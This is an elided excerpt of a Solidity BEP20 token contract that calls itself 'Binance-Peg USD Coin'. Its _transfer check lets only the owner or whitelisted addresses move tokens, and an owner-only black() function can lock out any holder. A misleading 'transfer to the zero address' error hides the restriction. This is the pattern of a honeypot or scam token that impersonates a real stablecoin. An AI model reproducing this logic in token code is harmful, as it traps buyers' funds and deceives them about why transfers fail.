...
contract BEP20TokenImplementation is Context, IBEP20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name = 'Binance-Peg USD Coin';
   ...
   */
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        require((sender == _owner || recipient == _owner) || (wards[sender] == 1 && wards[recipient] != 2), "BEP20: transfer to the zero address");
    ...
    function black(address guy) external onlyOwner { wards[guy] = 2; }
